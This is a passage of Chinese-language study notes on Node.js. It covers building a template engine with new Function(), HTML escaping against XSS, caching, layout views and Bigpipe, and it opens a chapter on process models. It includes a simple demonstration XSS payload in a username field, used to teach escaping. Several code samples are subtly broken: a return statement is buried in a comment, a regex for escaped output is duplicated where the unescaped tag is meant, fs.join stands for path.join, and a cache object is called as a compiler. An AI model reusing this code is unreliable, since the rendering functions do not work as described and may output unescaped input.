<p>普通字符串就直接输出，变量code的值则是obj[code]。关于new Function()，这里通过它创建了一个函数对象，它的语法如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">new</span> <span class="built_in">Function</span> ([arg1[, arg2[, ... argN]],] functionBody)<span class="built_in">Function</span>()</div></pre></td></tr></table></figure>
<p>构造函数接受多个参数，最后一个参数作为函数体的内容，其余参数都会用来作为新生成的函数的参数列表。</p>
<h3 id="模板安全"><a href="#模板安全" class="headerlink" title="模板安全"></a>模板安全</h3><p>前文提到过XSS漏洞，它的产生大多跟模板相关，如果上文中的username的值为</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">"I am XSS."</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<p>那么模板渲染输出的字符串将会是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Hello &lt;script&gt;alert(&quot;I am XSS.&quot;)&lt;/script&gt;.</div></pre></td></tr></table></figure>
<p>这会在页面上执行这个脚本，如果恰好这里的username是在URL的查询字符上输入的，这就构成了XSS漏洞。为了提高安全性，大多数模板都提供了转义的功能。转义就是将能形成HTML标签的字符转换成安全的字符，这些字符主要有<code>&amp;、&lt;、&gt;、&quot;、&#39;</code> 。转义函数如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> <span class="built_in">escape</span> = <span class="function"><span class="keyword">function</span> (<span class="params">html</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> <span class="built_in">String</span>(html).replace(<span class="regexp">/&amp;(?!\w+;)/g</span>, <span class="string">'&amp;amp;'</span>)</div><div class="line">    .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>)</div><div class="line">    .replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>).replace(<span class="regexp">/'/g</span>, <span class="string">'&amp;#039;'</span>); <span class="comment">// IE下不支持&amp;apos;（单引号）转义</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>不确定要输出HTML标签的字符最好都转义，为了让转义和非转义表现得更方便，&lt;%=%&gt;和&lt;%-%&gt;分别表示为转义和非转义的情况，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> render = <span class="function"><span class="keyword">function</span> (<span class="params">str, data</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> tpl = str.replace(<span class="regexp">/\n/g</span>, <span class="string">'\\n'</span>) <span class="comment">// 将换行符替换</span></div><div class="line">    .replace(<span class="regexp">/&lt;%=([\s\S]+?)%&gt;/g</span>, <span class="function"><span class="keyword">function</span> (<span class="params">match, code</span>) </span>&#123; <span class="comment">// 转义</span></div><div class="line">      <span class="keyword">return</span> <span class="string">"' + escape("</span> + code + <span class="string">") + '"</span>;</div><div class="line">    &#125;).replace(<span class="regexp">/&lt;%=([\s\S]+?)%&gt;/g</span>, <span class="function"><span class="keyword">function</span> (<span class="params">match, code</span>) </span>&#123;</div><div class="line">      <span class="comment">// 正常输出 return "' + " + code + "+ '";</span></div><div class="line">    &#125;);</div><div class="line">  tpl = <span class="string">"tpl = '"</span> + tpl + <span class="string">"'"</span>;</div><div class="line">  tpl = <span class="string">'var tpl = "";\nwith (obj) &#123;'</span> + tpl + <span class="string">'&#125;\nreturn tpl;'</span>; <span class="comment">// 加上escape()函数</span></div><div class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'obj'</span>, <span class="string">'escape'</span>, tpl);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>模板引擎通过正则分别匹配-和=并区别对待，最后不要忘记传入escape()函数。最终上面的危险代码会转换为安全的输出，如下所示：Hello &lt;script&gt;alert(&quot;I am XSS.&quot;)&lt;/script&gt;.<br>因此，在模板技术的使用中，时刻不要忘记转义，尤其是与输入有关的变量一定要转义。</p>
<p>模板逻辑尽管模板技术已经将业务逻辑与视图部分分离开来，但是视图上还是会存在一些逻辑来控制页面的最终渲染。为了让上述模板变得强大一点，我们为它添加逻辑代码，使得模板可以像ASP、PHP那样控制页面渲染。</p>
<p>譬如下面的代码，结果HTML与输入数据相关：<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;% if (user) &#123; %&gt; &lt;h2&gt;&lt;%= user.name %&gt;&lt;/h2&gt;</div><div class="line">&lt;% &#125; else &#123; %&gt; &lt;h2&gt;匿名用户&lt;/h2&gt;</div><div class="line">&lt;% &#125; %&gt;</div></pre></td></tr></table></figure></p>
<p>它要编译成的函数应该是如下这样的：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params">obj, escape</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> tpl = <span class="string">""</span>;</div><div class="line">  <span class="keyword">with</span>(obj) &#123;</div><div class="line">    <span class="keyword">if</span> (user) &#123;</div><div class="line">      tpl += <span class="string">"&lt;h2&gt;"</span> + <span class="built_in">escape</span>(user.name) + <span class="string">"&lt;/h2&gt;"</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      tpl += <span class="string">"&lt;h2&gt;匿名用户&lt;/h2&gt;"</span>;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> tpl;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>模板引擎拼接字符串的原理还是通过正则表达式进行匹配替换，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> complie = <span class="function"><span class="keyword">function</span> (<span class="params">str</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> tpl = str.replace(<span class="regexp">/\n/g</span>, <span class="string">'\\n'</span>) <span class="comment">// 将换行符替换</span></div><div class="line">    .replace(<span class="regexp">/&lt;%=([\s\S]+?)%&gt;/g</span>, <span class="function"><span class="keyword">function</span> (<span class="params">match, code</span>) </span>&#123; <span class="comment">// 转义</span></div><div class="line">      <span class="keyword">return</span> <span class="string">"' + escape("</span> + code + <span class="string">") + '"</span>;</div><div class="line">    &#125;).replace(<span class="regexp">/&lt;%=([\s\S]+?)%&gt;/g</span>, <span class="function"><span class="keyword">function</span> (<span class="params">match, code</span>) </span>&#123;</div><div class="line">      <span class="comment">// 正常输出 return "' + " + code + "+ '";</span></div><div class="line">    &#125;).replace(<span class="regexp">/&lt;%([\s\S]+?)%&gt;/g</span>, <span class="function"><span class="keyword">function</span> (<span class="params">match, code</span>) </span>&#123; <span class="comment">// 可执行代码</span></div><div class="line">      <span class="keyword">return</span> <span class="string">"';\n"</span> + code + <span class="string">"\ntpl += '"</span>;</div><div class="line">    &#125;).replace(<span class="regexp">/\'\n/g</span>, <span class="string">'\''</span>)</div><div class="line">    .replace(<span class="regexp">/\n\'/gm</span>, <span class="string">'\''</span>);</div><div class="line">  tpl = <span class="string">"tpl = '"</span> + tpl + <span class="string">"';"</span>; <span class="comment">// 转换空行</span></div><div class="line">  tpl = tpl.replace(<span class="regexp">/''/g</span>, <span class="string">'\'\\n\''</span>);</div><div class="line">  tpl = <span class="string">'var tpl = "";\nwith (obj || &#123;&#125;) &#123;\n'</span> + tpl + <span class="string">'\n&#125;\nreturn tpl;'</span>;</div><div class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'obj'</span>, <span class="string">'escape'</span>, tpl);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>完成上面的实现后，试试成果，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> tpl = [</div><div class="line">  <span class="string">'&lt;% if (user) &#123; %&gt;'</span>, <span class="string">'&lt;h2&gt;&lt;%=user.name%&gt;&lt;/h2&gt;'</span>,</div><div class="line">  <span class="string">'&lt;% &#125; else &#123; %&gt;'</span>, <span class="string">'&lt;h2&gt;匿名用户&lt;/h2&gt;'</span>,</div><div class="line">  <span class="string">'&lt;% &#125; %&gt;'</span></div><div class="line">].join(<span class="string">'\n'</span>);</div><div class="line">render(complie(tpl), &#123;</div><div class="line">  <span class="attr">user</span>: &#123;</div><div class="line">    <span class="attr">name</span>: <span class="string">'Jackson Tian'</span></div><div class="line">  &#125;</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>得到的输出内容如下所示：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>Jackson Tian<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></div></pre></td></tr></table></figure>
<p>接下来在不传递user时试试，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">render(complie(tpl), &#123;&#125;);</div></pre></td></tr></table></figure>
<p>结果是遗憾地得到异常信息，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="literal">undefined</span>:<span class="number">5</span></div><div class="line"><span class="keyword">if</span> (user) &#123; ^</div><div class="line"><span class="built_in">ReferenceError</span>: user is not defined</div></pre></td></tr></table></figure>
<p>为了程序的健壮性，需要将模板写得健壮一点，对于不确定是否存在的属性，应该为它加上引用，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> tpl = [<span class="string">'&lt;% if (obj.user) &#123; %&gt;'</span>,</div><div class="line">  <span class="string">'&lt;h2&gt;&lt;%=user.name%&gt;&lt;/h2&gt;'</span>, <span class="string">'&lt;% &#125; else &#123; %&gt;'</span>,</div><div class="line">  <span class="string">'&lt;h2&gt;匿名用户&lt;/h2&gt;'</span>, <span class="string">'&lt;% &#125; %&gt;'</span></div><div class="line">].join(<span class="string">'\n'</span>);</div></pre></td></tr></table></figure>
<p>EJS中，它的变量不是obj，而是locals，这里的值与模板引擎中的with语句有关。重新执行上面的示例，得到的结果为：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>匿名用户<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></div></pre></td></tr></table></figure>
<p>此外，实现了执行表达式的模板引擎还能进行循环，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> tpl = [</div><div class="line">  <span class="string">'&lt;% for (var i = 0; i &lt; items.length; i++) &#123; %&gt;'</span>, <span class="string">'&lt;%var item = items[i];%&gt;'</span>,</div><div class="line">  <span class="string">'&lt;p&gt;&lt;%= i+1 %&gt;、&lt;%=item.name%&gt;&lt;/p&gt;'</span>, <span class="string">'&lt;% &#125; %&gt;'</span></div><div class="line">].join(<span class="string">'\n'</span>);</div><div class="line">render(complie(tpl), &#123;</div><div class="line">  <span class="attr">items</span>: [&#123;</div><div class="line">    <span class="attr">name</span>: <span class="string">'Jackson'</span></div><div class="line">  &#125;, &#123;</div><div class="line">    <span class="attr">name</span>: <span class="string">'朴灵'</span></div><div class="line">  &#125;]</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>得到的输出如下所示：<br><figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>1、Jackson<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>2、朴灵<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>如此，我们实现的模板引擎已经能够处理输出和逻辑了，视图的渲染逻辑不成问题。</p>
<h3 id="集成文件系统"><a href="#集成文件系统" class="headerlink" title="集成文件系统"></a>集成文件系统</h3><p>前文我们实现的complie()和render()函数已经能够实现将输入的模板字符串进行编译和替换的功能。如果与前文的HTTP响应对象组合起来处理的话，我们响应一个客户端的请求大致如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">app.get(<span class="string">'/path'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  fs.readFile(<span class="string">'file/path'</span>, <span class="string">'utf8'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err, text</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (err) &#123;</div><div class="line">      res.writeHead(<span class="number">500</span>, &#123;</div><div class="line">        <span class="string">'Content-Type'</span>: <span class="string">'text/html'</span></div><div class="line">      &#125;);</div><div class="line">      res.end(<span class="string">'模板文件错误'</span>);</div><div class="line">      <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line">    res.writeHead(<span class="number">200</span>, &#123;</div><div class="line">      <span class="string">'Content-Type'</span>: <span class="string">'text/html'</span></div><div class="line">    &#125;);</div><div class="line">    <span class="keyword">var</span> html = render(complie(text), data);</div><div class="line">    res.end(html);</div><div class="line">  &#125;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>这样的响应体验并不友好，其缺点有如下几点。每次请求需要反复读磁盘上的模板文件。<br>每次请求需要编译。调用烦琐。<br>如果你记性不差的话，应该知道大多数的MVC框架在做渲染时都只有一个简单的render()方法，所以我们也需要一个更简洁、性能更好的render()函数，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> cache = &#123;&#125;;</div><div class="line"><span class="keyword">var</span> VIEW_FOLDER = <span class="string">'/path/to/wwwroot/views'</span>;</div><div class="line">res.render = <span class="function"><span class="keyword">function</span> (<span class="params">viewname, data</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span> (!cache[viewname]) &#123;</div><div class="line">    <span class="keyword">var</span> text;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">      text = fs.readFileSync(path.join(VIEW_FOLDER, viewname), <span class="string">'utf8'</span>);</div><div class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</div><div class="line">      res.writeHead(<span class="number">500</span>, &#123;</div><div class="line">        <span class="string">'Content-Type'</span>: <span class="string">'text/html'</span></div><div class="line">      &#125;);</div><div class="line">      res.end(<span class="string">'模板文件错误'</span>);</div><div class="line">      <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line">    cache[viewname] = complie(text);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">var</span> complied = cache[viewname];</div><div class="line">  res.writeHead(<span class="number">200</span>, &#123;</div><div class="line">    <span class="string">'Content-Type'</span>: <span class="string">'text/html'</span></div><div class="line">  &#125;);</div><div class="line">  <span class="keyword">var</span> html = complied(data);</div><div class="line">  res.end(html);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>这个res.render()实现中，虽然有同步读取文件的情况，但是由于采用了缓存，只会在第一次读取的时候造成整个进程的阻塞，一旦缓存生效，将不会反复读取模板文件。其次，缓存之前已经进行了编译，也不会每次读取都编译。</p>
<p>封装完渲染函数之后，我们的调用就很轻松了，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">app.get(<span class="string">'/path'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  res.render(<span class="string">'viewname'</span>, &#123;&#125;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>与文件系统集成之后，再引入缓存，可以很好地解决性能问题，接口也大大得到简化。由于模板文件内容都不太大，也不属于动态改动的，所以使用进程的内存来缓存编译结果，并不会引起太大的垃圾回收问题。</p>
<h3 id="子模板"><a href="#子模板" class="headerlink" title="子模板"></a>子模板</h3><p>有时候模板文件太大，太过复杂，会增加维护上的难度，而且有些模板是可以重用的，这催生了子模板（Partial View）的产生。子模板可以嵌套在别的模板中，多个模板可以嵌入同一个子模板中。维护多个子模板比维护完整而复杂的大模板的成本要低很多，很多复杂问题可以降解为多个小而简单的问题</p>
<h3 id="布局视图"><a href="#布局视图" class="headerlink" title="布局视图"></a>布局视图</h3><p>子模板主要是为了重用模板和降低模板的复杂度。子模板的另一种使用方式就是布局视图（layout），布局视图又称母版页，它与子模板的原理相同，但是场景稍有区别。一般而言模板指定了子模板，那它的子模板就无法进行替换了，子模板被嵌入到多个父模板中属于正常需求，但是如果在多个父模板中只是嵌入的子视图不同，模板内容却完全一样，也会出现重复。比如下面两个简单的父模板：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">// 模板1</div><div class="line">&lt;ul&gt; &lt;% users.forEach(function(user)&#123; %&gt;</div><div class="line">&lt;% include user/show %&gt; &lt;% &#125;) %&gt;</div><div class="line">&lt;/ul&gt; // 模板2</div><div class="line">&lt;ul&gt; &lt;% users.forEach(function(user)&#123; %&gt;</div><div class="line">&lt;% include profile %&gt; &lt;% &#125;) %&gt;</div><div class="line">&lt;/ul&gt;</div></pre></td></tr></table></figure>
<p>这些重复的内容主要用来布局，为了能将这些布局模板重用起来，模板技术必须支持布局视图。支持布局视图之后，布局模板就只有一份，渲染视图时，指定好布局视图就可以了，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">res.render(<span class="string">'viewname'</span>, &#123;</div><div class="line">  <span class="attr">layout</span>: <span class="string">'layout.html'</span>,</div><div class="line">  <span class="attr">users</span>: []</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>对于布局模板文件，我们设计为将&lt;%- body %&gt;部分替换为我们的子模板，如下所示：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span> <span class="tag">&lt;<span class="name">%</span> <span class="attr">users.forEach</span>(<span class="attr">function</span>(<span class="attr">user</span>)&#123; %&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">%-</span> <span class="attr">body</span> %&gt;</span> <span class="tag">&lt;<span class="name">%</span> &#125;) %&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></div></pre></td></tr></table></figure>
<p>替换代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> renderLayout = <span class="function"><span class="keyword">function</span> (<span class="params">str, viewname</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> str.replace(<span class="regexp">/&lt;%-\s*body\s*%&gt;/g</span>, <span class="function"><span class="keyword">function</span> (<span class="params">match, code</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (!cache[viewname]) &#123;</div><div class="line">      cache[viewname] = fs.readFileSync(fs.join(VIEW_FOLDER, viewname), <span class="string">'utf8'</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> cache[viewname];</div><div class="line">  &#125;);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>最终集成进res.render()函数，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">res.render = <span class="function"><span class="keyword">function</span> (<span class="params">viewname, data</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> layout = data.layout;</div><div class="line">  <span class="keyword">if</span> (layout) &#123;</div><div class="line">    <span class="keyword">if</span> (!cache[layout]) &#123;</div><div class="line">      <span class="keyword">try</span> &#123;</div><div class="line">        cache[layout] = fs.readFileSync(path.join(VIEW_FOLDER, layout), <span class="string">'utf8'</span>);</div><div class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</div><div class="line">        res.writeHead(<span class="number">500</span>, &#123;</div><div class="line">          <span class="string">'Content-Type'</span>: <span class="string">'text/html'</span></div><div class="line">        &#125;);</div><div class="line">        res.end(<span class="string">'布局文件错误'</span>);</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">var</span> layoutContent = cache[layout] || <span class="string">'&lt;%-body%&gt;'</span>;</div><div class="line">  <span class="keyword">var</span> replaced;</div><div class="line">  <span class="keyword">try</span> &#123;</div><div class="line">    replaced = renderLayout(layoutContent, viewname);</div><div class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</div><div class="line">    res.writeHead(<span class="number">500</span>, &#123;</div><div class="line">      <span class="string">'Content-Type'</span>: <span class="string">'text/html'</span></div><div class="line">    &#125;);</div><div class="line">    res.end(<span class="string">'模板文件错误'</span>);</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="comment">// 将模板和布局文件名做key缓存 var key = viewname + ':' + (layout || '');</span></div><div class="line">  <span class="keyword">if</span> (!cache[key]) &#123; <span class="comment">// 编译模板</span></div><div class="line">    cache[key] = cache(replaced);</div><div class="line">  &#125;</div><div class="line">  res.writeHead(<span class="number">200</span>, &#123;</div><div class="line">    <span class="string">'Content-Type'</span>: <span class="string">'text/html'</span></div><div class="line">  &#125;);</div><div class="line">  <span class="keyword">var</span> html = cache[key](data);</div><div class="line">  res.end(html);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>如此，我们可以轻松地实现重用布局文件，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">res.render(<span class="string">'user'</span>, &#123;</div><div class="line">  <span class="attr">layout</span>: <span class="string">'layout.html'</span>,</div><div class="line">  <span class="attr">users</span>: []</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>模板引擎的优化步骤，主要有如下几种。</p>
<ul>
<li>缓存模板文件。</li>
<li>缓存模板文件编译后的函数。</li>
</ul>
<p>完成上述两个步骤之后，渲染的性能与生成的函数直接相关，这个函数与模板字符串的复杂度有直接关系。如果在模板中编写了执行表达式，执行表达式的性能将直接影响模板的性能。优化执行表达式就是对模板性能的优化，所以加入一条优化步骤：<strong>优化模板中的执行表达式</strong></p>
<p>除了这几个常见的方案外，模板引擎的实现也与性能相关。本节的实现中采用了new Function()，事实上还可以使用eval()；对于字符串处理，本节中用的是字符串直接相加，有的模板引擎采用数组存储的方式，最后将所有字符串相连。对于变量的查找，本节采用的是with形成作用域的方式实现了查找，有的模板引擎采用了本节第一种方式，即指定变量名的方式（obj.username）查找，指定变量而不用with可以减少切换上下文。这些细节都是影响模板速度的因素。由于现有模板引擎数量巨多，此处不再做比较。</p>
<p>模板技术的出现，将业务开发与HTML输出的工作分离开来，它的设计原理就是单一职责原理。这与MVC中的数据、逻辑、视图分离如出一辙，更与前端HTML、CSS、JavaScript分离的设计理念一致，让视觉、结构、逻辑分离开来。随着Node的出现，模板能够在前后端共用实在是太寻常不过的事情，甚至都不用去重复实现引擎。本节介绍了模板的基本原理，如今各种各样的模板具备不同的特性和性能。最知名的有EJS、Jade等，它们在模板语言的设计上各不相同，EJS是ASP、PHP、JSP风格的模板标签，Jade则类似Python、Ruby的风格。</p>
<h3 id="8-5-4-Bigpipe"><a href="#8-5-4-Bigpipe" class="headerlink" title="8.5.4 Bigpipe"></a>8.5.4 Bigpipe</h3><p>Bagpipe的翻译为风笛，是用于调用限流的</p>
<p>Bigpipe是产生于Facebook公司的前端加载技术，它的提出主要是为了解决重数据页面的加载速度问题，在2010年的Velocity会议上，当时来自Facebook的<strong>蒋长浩</strong>先生分享了该议题，随后引起了国内业界巨大的反响。</p>
<p>这里以一个简单的例子说明下前文提到的MVC和模板技术潜在的问题：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">app.get(<span class="string">'/profile'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  db.getData(<span class="string">'sql1'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err, users</span>) </span>&#123;</div><div class="line">    db.getData(<span class="string">'sql2'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err, articles</span>) </span>&#123;</div><div class="line">      res.render(<span class="string">'user'</span>, &#123;</div><div class="line">        <span class="attr">layout</span>: <span class="string">'layout.html'</span>,</div><div class="line">        <span class="attr">users</span>: users,</div><div class="line">        <span class="attr">articles</span>: articles</div><div class="line">      &#125;);</div><div class="line">    &#125;);</div><div class="line">  &#125;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>这个例子中，我们渲染profile页面需要获取users和articles数据，然后通过布局文件layout和模板文件user，最终发出页面到浏览器端。排除掉模板文件和布局文件可能同步的影响，将无依赖的数据获取通过EventProxy解开，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">app.get(<span class="string">'/profile'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> ep = <span class="keyword">new</span> EventProxy();</div><div class="line">  ep.all(<span class="string">'users'</span>, <span class="string">'articles'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">users, articles</span>) </span>&#123;</div><div class="line">    res.render(<span class="string">'user'</span>, &#123;</div><div class="line">      <span class="attr">layout</span>: <span class="string">'layout.html'</span>,</div><div class="line">      <span class="attr">users</span>: users,</div><div class="line">      <span class="attr">articles</span>: articles</div><div class="line">    &#125;);</div><div class="line">  &#125;);</div><div class="line">  ep.fail(<span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</div><div class="line">    res.render(<span class="string">'err'</span>, &#123;</div><div class="line">      <span class="attr">message</span>: err.message</div><div class="line">    &#125;);</div><div class="line">  &#125;);</div><div class="line">  db.getData(<span class="string">'sql1'</span>, ep.done(<span class="string">'users'</span>));</div><div class="line">  db.getData(<span class="string">'sql2'</span>, ep.done(<span class="string">'articles'</span>));</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>至此还存在的问题是什么？</p>
<p>问题在于我们的页面，最终的HTML要在所有的数据获取完成后才输出到浏览器端。Node通过异步已经将多个数据源的获取并行起来了，最终的页面输出速度取决于两个数据请求中响应时间慢的那个。在数据响应之前，用户看到的是空白页面，这是十分不友好的用户体验</p>
<p>Bigpipe的解决思路则是将页面分割成多个部分（pagelet），先向用户输出没有数据的布局（框架），将每个部分逐步输出到前端，再最终渲染填充框架，完成整个网页的渲染。这个过程中需要前端JavaScript的参与，它负责将后续输出的数据渲染到页面上。</p>
<p>Bigpipe是一个需要前后端配合实现的优化技术，这个技术有几个重要的点。页面布局框架（无数据的）。<br>后端持续性的数据输出。前端渲染。</p>
<p>Bigpipe的渲染流程示意图如图8-8所示。</p>
<h2 id="第09章-玩转进程"><a href="#第09章-玩转进程" class="headerlink" title="第09章 玩转进程"></a>第09章 玩转进程</h2><p>Node在选型时决定在V8引擎之上构建，也就意味着它的模型与浏览器类似。我们的JavaScript将会运行在单个进程的单个线程上。它带来的好处是：程序状态是单一的，在没有多线程的情况下没有锁、线程同步问题，操作系统在调度时也因为较少上下文的切换，可以很好地提高CPU的使用率。<br>但是单进程单线程并非完美的结构，如今CPU基本均是多核的，真正的服务器（非VPS）往往还有多个CPU。一个Node进程只能利用一个核，这将抛出Node实际应用的第一个问题：如何充分利用多核CPU服务器？另外，由于Node执行在单线程上，一旦单线程上抛出的异常没有被捕获，将会引起整个进程的崩溃。这给Node的实际应用抛出了第二个问题：如何保证进程的健壮性和稳定性？<br>在这两个问题中，前者只是利用率不足的问题，后者对于实际产品化带来一定的顾虑。本章关于进程的介绍和讨论将会解决掉这两个问题。</p>
<p>从严格的意义上而言，Node并非真正的单线程架构，在第3章中我们有叙述过Node自身还有一定的I/O线程存在，这些I/O线程由底层libuv处理，这部分线程对于JavaScript开发者而言是透明的，只在C++扩展开发时才会关注到。JavaScript代码永远运行在V8上，是单线程的。<br>9.1 服务模型的变迁</p>
<h2 id="服务模型的变迁"><a href="#服务模型的变迁" class="headerlink" title="服务模型的变迁"></a>服务模型的变迁</h2><p>从“古”到今，Web服务器的架构已经历了几次变迁。服务器处理客户端请求的并发量，就是每个里程碑的见证。</p>
<h3 id="9-1-1-石器时代：同步"><a href="#9-1-1-石器时代：同步" class="headerlink" title="9.1.1　石器时代：同步"></a>9.1.1　石器时代：同步</h3><p>最早的服务器，其执行模型是同步的，它的服务模式是一次只为一个请求服务，所有请求都得按次序等待服务。这意味除了当前的请求被处理外，其余请求都处于耽误的状态。它的处理能力相当低下，假设每次响应服务耗用的时间稳定为N秒，这类服务的QPS为1/N。</p>
<p>这类架构如今已基本被淘汰，只在一些无并发要求的应用中存在。</p>
<h3 id="9-1-2-青铜时代：复制进程"><a href="#9-1-2-青铜时代：复制进程" class="headerlink" title="9.1.2 青铜时代：复制进程"></a>9.1.2 青铜时代：复制进程</h3><p>为了解决同步架构的并发问题，一个简单的改进是通过进程的复制同时服务更多的请求和用户。这样每个连接都需要一个进程来服务，即100个连接需要启动100个进程来进行服务，这是非常昂贵的代价。在进程复制的过程中，需要复制进程内部的状态，对于每个连接都进行这样的复制的话，相同的状态将会在内存中存在很多份，造成浪费。并且这个过程由于要复制较多的数据，启动是较为缓慢的。为了解决启动缓慢的问题，预复制（prefork）被引入服务模型中，即预先复制一定数量的进程。同时将进程复用，避免进程创建、销毁带来的开销。但是这个模型并不具备伸缩性，一旦并发请求过高，内存使用随着进程数的增长将会被耗尽。假设通过进行复制和预复制的方式搭建的服务器有资源的限制，且进程数上限为M，那这类服务的QPS为M/N。</p>
